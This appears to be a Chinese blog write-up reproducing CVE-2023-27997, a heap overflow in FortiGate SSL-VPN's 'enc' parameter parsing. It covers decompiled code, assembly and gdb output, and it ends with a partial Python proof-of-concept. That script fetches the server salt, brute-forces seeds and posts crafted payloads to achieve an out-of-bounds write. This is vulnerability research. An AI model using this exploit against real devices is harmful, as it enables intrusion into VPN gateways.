          <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>复现完 <strong>CVE-2022-42475</strong>之后，便关注到了此漏洞。这是一个由于边界大小判断不当，从而导致的一个堆上越界写的漏洞，可实现任意命令执行。由于笔者的逆向能力不是很好，本漏洞也是跟着其他师傅的博客复现而成，如果本文中的描述有什么不准确的地方，还请各位师傅海涵。</p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞出现在 <strong>sslvpn</strong>对 <strong>enc</strong>参数处理的函数中，这里把他重命名为 <strong>parse_enc_data</strong>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">v22 = find_header(*(_QWORD *)(v11 + <span class="number">744</span>), (<span class="type">const</span> <span class="type">char</span> *)&amp;byte_3347915);</span><br><span class="line">  <span class="keyword">if</span> ( v22 &amp;&amp; (<span class="type">int</span>)parse_enc_data(v11, a1, v22) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    log___(v11, <span class="number">8LL</span>, (__int64)<span class="string">&quot;could not decode &#x27;enc&#x27; data properly.&quot;</span>);</span><br><span class="line">    v16 = <span class="number">4100</span>;</span><br><span class="line">LABEL_20:</span><br><span class="line">    <span class="keyword">if</span> ( *((__int64 *)v19 + <span class="number">405</span>) &gt; <span class="number">0</span> )</span><br><span class="line">      sub_16FD7E0(*a1, v19 + <span class="number">3240</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(v97, <span class="string">&quot;/remote/error?msg=%d&quot;</span>, v16);</span><br><span class="line"></span><br><span class="line">.rodata:<span class="number">0000000003347915</span> <span class="number">65</span>                      byte_3347915    db <span class="string">&#x27;e&#x27;</span>                  ; DATA XREF: sub_1729160+<span class="number">6F</span>↑o .rodata:<span class="number">0000000003347915</span>                                                                 ; sub_17300E0+<span class="number">1B</span>7↑o ...</span><br><span class="line">.rodata:<span class="number">0000000003347916</span> <span class="number">6</span>E                                      db <span class="string">&#x27;n&#x27;</span></span><br><span class="line">.rodata:<span class="number">0000000003347917</span> <span class="number">63</span>                                      db <span class="string">&#x27;c&#x27;</span></span><br></pre></td></tr></table></figure>

<p>函数中，先是判断了 <strong>enc</strong>的长度是否大于 <strong>11</strong>并且是否是偶数。如果 <strong>enc</strong>的长度大于 <strong>11</strong>并且是偶数才会进行接下来进一步的处理。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">parse_enc_data</span><span class="params">(__int64 a1, __int64 *pool, <span class="type">const</span> <span class="type">char</span> *enc)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  v25 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(enc);</span><br><span class="line">  enc_raw_len = v4;</span><br><span class="line">  v19 = v4;</span><br><span class="line">  <span class="keyword">if</span> ( v4 &lt;= <span class="number">11</span> || (v4 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    log___(a1, <span class="number">8LL</span>, (__int64)<span class="string">&quot;enc data length invalid (%d)\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)v4);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>接着是用 <strong>md5</strong>对密钥流进行初始化。其中 <strong>salt</strong>由服务器产生，可通过请求 <strong>&#x2F;remote&#x2F;info</strong>获取到它的值，<strong>enc</strong>的前八个字节由我们控制，还有一个固定的字符串。接着根据 <strong>(enc_raw_len &gt;&gt; 1) + 1</strong> 分配缓冲区。并对 <strong>enc</strong>传入的数据进行处理，并赋值到分配的堆上。具体处理方式就是将原来传进来的字符串，以两个字节的 <strong>ascii</strong>码看成一个新的字节。比如传进来的是 <strong>010203040506abcdefgh</strong>字符串，那么就会转为 <strong>\x01\x02\x03\x04\x05\x06\xab\xcd\xef\xgh</strong>储存到堆上，并在末尾置零。这大概也就是为什么之前分配空间时，以输入长度的 <strong>1&#x2F;2</strong>进行分配的原因。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">sub_17318E0(salt, (__int64)enc, <span class="number">8</span>, (__int64)md5);</span><br><span class="line">ptr = (<span class="type">const</span> <span class="type">char</span> *)sub_16D1AC0(*pool, (enc_raw_len &gt;&gt; <span class="number">1</span>) + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> ( ptr )</span><br><span class="line">&#123;</span><br><span class="line">v5 = <span class="number">0LL</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  v6 = sub_175BD40(enc[<span class="number">2</span> * v5]);</span><br><span class="line">  ptr[v5] = sub_175BD40(enc[<span class="number">2</span> * v5 + <span class="number">1</span>]) + <span class="number">16</span> * v6;</span><br><span class="line">  ++v5;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v19 &gt; <span class="number">2</span> * (<span class="type">int</span>)v5 );</span><br><span class="line">v7 = ((<span class="type">unsigned</span> <span class="type">int</span>)(enc_raw_len - <span class="number">1</span>) &gt;&gt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> ( enc_raw_len &lt;= <span class="number">0</span> )</span><br><span class="line">    v7 = <span class="number">1</span>;</span><br><span class="line">ptr[v7] = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_17318E0</span><span class="params">(<span class="type">char</span> *salt, __int64 enc, <span class="type">int</span> len, __int64 md5)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">104</span>]; <span class="comment">// [rsp+0h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+68h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  MD5_Init(v8);</span><br><span class="line">  v6 = <span class="built_in">strlen</span>(salt);</span><br><span class="line">  MD5_Update((__int64)v8, (__int64)salt, v6);</span><br><span class="line">  MD5_Update((__int64)v8, enc, len);</span><br><span class="line">  MD5_Update((__int64)v8, (__int64)<span class="string">&quot;GCC is the GNU Compiler Collection.&quot;</span>, <span class="number">35LL</span>);</span><br><span class="line">  MD5_Final(md5, (__int64)v8);</span><br><span class="line">  <span class="keyword">return</span> v9 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(gdb) x/s <span class="number">0x7f20df4decf8</span></span><br><span class="line"><span class="number">0x7f20df4decf8</span>: <span class="string">&quot;010203040506abcdefgh&quot;</span></span><br><span class="line">(gdb) x/<span class="number">20b</span>x <span class="number">0x7f20df4decf8</span></span><br><span class="line"><span class="number">0x7f20df4decf8</span>: <span class="number">0x30</span>    <span class="number">0x31</span>    <span class="number">0x30</span>    <span class="number">0x32</span>    <span class="number">0x30</span>    <span class="number">0x33</span>    <span class="number">0x30</span>    <span class="number">0x34</span></span><br><span class="line"><span class="number">0x7f20df4ded00</span>: <span class="number">0x30</span>    <span class="number">0x35</span>    <span class="number">0x30</span>    <span class="number">0x36</span>    <span class="number">0x61</span>    <span class="number">0x62</span>    <span class="number">0x63</span>    <span class="number">0x64</span></span><br><span class="line"><span class="number">0x7f20df4ded08</span>: <span class="number">0x65</span>    <span class="number">0x66</span>    <span class="number">0x67</span>    <span class="number">0x68</span></span><br><span class="line"></span><br><span class="line">(gdb) x/<span class="number">20b</span>x <span class="number">0x7f20df4ded10</span></span><br><span class="line"><span class="number">0x7f20df4ded10</span>: <span class="number">0x01</span>    <span class="number">0x02</span>    <span class="number">0x03</span>    <span class="number">0x04</span>    <span class="number">0x05</span>    <span class="number">0x06</span>    <span class="number">0xab</span>    <span class="number">0xcd</span></span><br><span class="line"><span class="number">0x7f20df4ded18</span>: <span class="number">0xef</span></span><br></pre></td></tr></table></figure>

<p>接下来解密部分的伪代码我感觉是IDA反编译有问题（或者是笔者逆向功底不够）。根据汇编，笔者认为三处加了注释的地方均有问题，正确的伪代码应该如注释所示。也就是<strong>enc_raw_len-5</strong>与 <strong>real_size</strong>进行比较。判断的是 <strong>raw_size</strong>经过 <strong>xor</strong>之后得到的 <strong>real_size</strong>是否存在。并且循环次数是 <strong>real_size - 1</strong>。所以这里就会存在一个堆溢出。因为是通过**(enc_raw_len &gt;&gt; 1) + 1<strong>分配的堆空间，而解密的循环次数（</strong>real_size<strong>）则可以完全被我们控制，并且只要满足</strong>enc_raw_len-5&gt;real_size<strong>即可。也就是只要满足</strong>(enc_raw_len &gt;&gt; 1) + 1&lt;real_size&lt;enc_raw_len-5**，就可以实现堆上越界写。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">raw_size = *((_WORD *)v8 + <span class="number">2</span>);</span><br><span class="line">real_size = (<span class="type">unsigned</span> __int8)(raw_size ^ md5[<span class="number">0</span>]);</span><br><span class="line">BYTE1(real_size) = md5[<span class="number">1</span>] ^ HIBYTE(raw_size);</span><br><span class="line"><span class="keyword">if</span>(enc_raw_len - <span class="number">5</span> &lt;= (<span class="type">unsigned</span> __int8)(raw_size ^ md5[<span class="number">0</span>]) ) <span class="comment">//enc_raw_len-5&lt;=real_size</span></span><br><span class="line">&#123;</span><br><span class="line">   ...</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">data_ptr = v8 + <span class="number">6</span>;</span><br><span class="line">ptr = data_ptr;</span><br><span class="line"><span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)raw_size != md5[<span class="number">0</span>] ) <span class="comment">// if (real_size)</span></span><br><span class="line">&#123;</span><br><span class="line">  real_size_1 = (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="type">unsigned</span> __int8)(raw_size ^ md5[<span class="number">0</span>]) - <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// real_size_1 = real_size - 1;</span></span><br><span class="line">  cnt = <span class="number">0LL</span>;</span><br><span class="line">  v15 = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      data_ptr[cnt] ^= md5[v15]; <span class="comment">// bof</span></span><br><span class="line">      <span class="keyword">if</span> ( real_size_1 == cnt )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v15 = ((_BYTE)cnt + <span class="number">3</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (((_BYTE)cnt + <span class="number">3</span>) &amp; <span class="number">0xF</span>) == <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v20 = real_size;</span><br><span class="line">        MD5_Init(v23);</span><br><span class="line">        MD5_Update((__int64)v23, (__int64)md5, <span class="number">16LL</span>);</span><br><span class="line">        MD5_Final((__int64)md5, (__int64)v23);</span><br><span class="line">        real_size = v20;</span><br><span class="line">      &#125;</span><br><span class="line">      data_ptr = ptr;</span><br><span class="line">      ++cnt;</span><br><span class="line">    &#125;</span><br><span class="line">    data_ptr = &amp;ptr[(<span class="type">unsigned</span> __int16)real_size];</span><br><span class="line">&#125;</span><br><span class="line">*data_ptr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:<span class="number">0000000001731714</span> <span class="number">48</span> <span class="number">83</span> C2 <span class="number">06</span>                             add     rdx, <span class="number">6</span></span><br><span class="line">.text:<span class="number">0000000001731718</span> <span class="number">48</span> <span class="number">89</span> <span class="number">95</span> <span class="number">40</span> FF FF FF                    mov     [rbp+ptr], rdx</span><br><span class="line">.text:<span class="number">000000000173171F</span> <span class="number">45</span> <span class="number">85</span> C0                                test    r8d, r8d</span><br><span class="line">.text:<span class="number">0000000001731722</span> <span class="number">0F</span> <span class="number">84</span> <span class="number">87</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                       jz      loc_17317AF</span><br><span class="line">.text:<span class="number">0000000001731728</span> <span class="number">45</span> <span class="number">8</span>D <span class="number">68</span> FF                             lea     r13d, [r8<span class="number">-1</span>]</span><br></pre></td></tr></table></figure>

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>这里的异或会导致前面的数据被污染，同时原作者也提供了一种很好的思路。即利用二次异或值不变的特性，加上末尾置零的特性，来实现向后越界写任意数据。作者给出的例子是在溢出偏移为 <strong>5000</strong>的位置上写 <strong>\x50</strong>。计算出所需的 <strong>seed</strong>后。第一次来实现末尾置零，第二次恢复前面数据的同时，也成功把偏移为 <strong>5000</strong>的地方改成了 <strong>\x50</strong>。</p>
<p><img src="/img/CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow/1.png"></p>
<p>我利用该思路，尝试把溢出偏移为 <strong>0x10</strong>的值改为 <strong>0xaa</strong>。我申请的堆块大小为 <strong>0xfe8</strong>，溢出偏移为 <strong>0x10</strong>处应该是 <strong>0x7f20de80a010</strong>，可以发现被成功修改为 <strong>0xaa</strong>。接着循环利用此方式，即可实现写任意长度数据。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">(gdb) i r rsi</span><br><span class="line">rsi            0xfe8    4072</span><br><span class="line">(gdb) ni</span><br><span class="line">0x000000000173164e in ?? ()</span><br><span class="line">(gdb) i r rax</span><br><span class="line">rax            0x7f20de809018   139779148648472</span><br><span class="line">(gdb) x/10gx 0x7f20de809018</span><br><span class="line">0x7f20de809018: 0x565f15f46de5e4e9      0xd60a439f3f849e41</span><br><span class="line">0x7f20de809028: 0x8e8abb7027401e05      0xcf46b2988c0117ee</span><br><span class="line">0x7f20de809038: 0x772fe4c73b4664a1      0xb1087fe34b7b5a7b</span><br><span class="line">0x7f20de809048: 0x90ac9ccd1e18d43f      0xbc94283552ba72f5</span><br><span class="line">0x7f20de809058: 0x35d4acf803fde83a      0x913d36fe9630a124</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">(gdb) x/10gx 0x7f20de809018+0xfe8</span><br><span class="line">0x7f20de80a000: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f20de80a010: 0x00000000000000aa      0x0000000000000000</span><br><span class="line">0x7f20de80a020: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f20de80a030: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f20de80a040: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>剩下的则是如何控制程序执行流，这与之前写过的<strong>CVE-2022-42475</strong>大同小异，在此则不过多叙述。最后给出写一字节的 <strong>poc</strong>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">IP = <span class="string">&quot;192.168.229.163&quot;</span></span><br><span class="line">PORT = <span class="number">4443</span></span><br><span class="line"></span><br><span class="line">p32 = <span class="keyword">lambda</span> x: struct.pack(<span class="string">&quot;&lt;I&quot;</span>, x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_ssl_socket</span>(<span class="params">_ip, _port</span>):</span><br><span class="line">    _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    _socket.connect((_ip, _port))</span><br><span class="line">    _context = ssl._create_unverified_context()</span><br><span class="line">    _ssl_socket = _context.wrap_socket(_socket)</span><br><span class="line">    <span class="keyword">return</span> _ssl_socket</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Expliot</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, _ip, _port</span>):</span><br><span class="line">        self.ip = _ip</span><br><span class="line">        self.port = _port</span><br><span class="line">        self.salt = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_salt</span>(<span class="params">self, _socket</span>):</span><br><span class="line">        _request = <span class="string">&quot;&quot;&quot;GET /remote/info HTTP/1.1\r\nHost: %s:%d\r\nConnection: close\r\n\r\n&quot;&quot;&quot;</span> % (self.ip, self.port)</span><br><span class="line">        _socket.sendall(_request.encode())</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;salt&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> (salt := _socket.recv(<span class="number">1024</span>)):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] Get salt fault&quot;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">        self.salt = salt[salt.find(<span class="string">b&quot;salt&quot;</span>)+<span class="number">6</span>:salt.find(<span class="string">b&quot;salt&quot;</span>)+<span class="number">14</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">calc_packet_data_size</span>(<span class="params">self, _size</span>):</span><br><span class="line">        self.BLOCK_HEAD = <span class="number">0x18</span></span><br><span class="line">        self.PACKET_SIZE = _size</span><br><span class="line">        self.DISTANCE = self.PACKET_SIZE - self.BLOCK_HEAD - <span class="number">6</span></span><br><span class="line">        alloc_size = self.PACKET_SIZE</span><br><span class="line">        alloc_size -= self.BLOCK_HEAD</span><br><span class="line">        <span class="comment"># target = (inlen &gt;&gt; 1) + 1</span></span><br><span class="line">        inlen = (alloc_size - <span class="number">1</span>) &lt;&lt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># inlen consists of a header of size 12 followed by the data in hexa</span></span><br><span class="line">        inlen_data = inlen - <span class="number">12</span></span><br><span class="line">        inlen_unhex = inlen_data &gt;&gt; <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        self.packet_data_size = inlen_unhex</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">calc_md5</span>(<span class="params">self, _seed</span>):</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(_seed) == <span class="number">8</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> hashlib.md5(self.salt + _seed + <span class="string">b&quot;GCC is the GNU Compiler Collection.&quot;</span>).digest()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_payload</span>(<span class="params">self, size=<span class="literal">None</span>, _seed=<span class="string">&quot;00000000&quot;</span></span>):</span><br><span class="line">        md5 = self.calc_md5(_seed.encode())</span><br><span class="line">        <span class="comment"># print(md5)</span></span><br><span class="line">        max_size = self.packet_data_size * <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            size = max_size</span><br><span class="line">        <span class="keyword">elif</span> size &gt; max_size:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;create_payload: size &gt; max_size&quot;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">        len_high = (size &gt;&gt; <span class="number">8</span>) ^ md5[<span class="number">1</span>]</span><br><span class="line">        len_low = (size &amp; <span class="number">0xFF</span>) ^ md5[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        data = <span class="built_in">bytes</span>((len_low, len_high)) + <span class="string">b&quot;1&quot;</span> * self.packet_data_size</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(size))</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(size &amp; <span class="number">0xFF</span>))</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(size &gt;&gt; <span class="number">8</span>))</span><br><span class="line">        payload = _seed + data.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> payload</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_seed_for_md5_byte</span>(<span class="params">self, pos, value</span>):</span><br><span class="line">        distance = self.DISTANCE + pos</span><br><span class="line">        distance += <span class="number">2</span></span><br><span class="line">        MD5_LEN = <span class="number">16</span></span><br><span class="line">        rounds, offset = <span class="built_in">divmod</span>(distance, MD5_LEN)</span><br><span class="line">        <span class="built_in">print</span>(self.DISTANCE)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">divmod</span>(distance, MD5_LEN))</span><br><span class="line">        md5 = hashlib.md5</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> _seed <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">24</span>):</span><br><span class="line">            _seed = <span class="string">&quot;00&quot;</span> + p32(_seed)[:<span class="number">3</span>].<span class="built_in">hex</span>()</span><br><span class="line">            <span class="built_in">hash</span> = self.calc_md5(_seed.encode())</span><br><span class="line">            keystream = <span class="built_in">hash</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">                <span class="built_in">hash</span> = md5(<span class="built_in">hash</span>).digest()</span><br><span class="line">                keystream += <span class="built_in">hash</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">hash</span>[offset] == value:</span><br><span class="line">                <span class="built_in">print</span>(_seed)</span><br><span class="line">                <span class="built_in">print</span>(keystream[self.DISTANCE + <span class="number">2</span> : self.DISTANCE + <span class="number">2</span> + pos + <span class="number">1</span>].<span class="built_in">hex</span>())</span><br><span class="line">                <span class="keyword">return</span> _seed, keystream[self.DISTANCE + <span class="number">2</span> : self.DISTANCE + <span class="number">2</span> + pos + <span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] unable to get seed&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send_payload</span>(<span class="params">self, _sock, _data</span>):</span><br><span class="line">        _data = <span class="string">&quot;ajax=1&amp;username=asdf&amp;realm=&amp;enc=%s&quot;</span> % _data</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(_data) &gt; <span class="number">0x10000</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] payload too long&quot;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">        _request = <span class="string">&quot;&quot;&quot;POST /remote/hostcheck_validate HTTP/1.1\r\nHost: %s:%d\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0\r\nContent-Type: text/plain;charset=UTF-8\r\nConnection: keep-alive\r\nContent-Length: %d\r\n\r\n%s&quot;&quot;&quot;</span> % (self.ip, self.port, <span class="built_in">len</span>(_data), _data)</span><br><span class="line">        <span class="comment"># print(_request)</span></span><br><span class="line">        _sock.sendall(_request.encode())</span><br><span class="line">        _responce = _sock.recv(<span class="number">2048</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    </span><br><span class="line">    exp = Expliot(IP, PORT)</span><br><span class="line">    salt_sock = create_ssl_socket(IP, PORT)</span><br><span class="line">    exp.get_salt(salt_sock)</span><br><span class="line">    salt_sock.close()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(exp.salt)</span><br><span class="line"></span><br><span class="line">    exp.calc_packet_data_size(<span class="number">0x1000</span>)</span><br><span class="line">    <span class="comment"># print(hex(exp.packet_data_size))</span></span><br><span class="line"></span><br><span class="line">    payload = exp.create_payload()</span><br><span 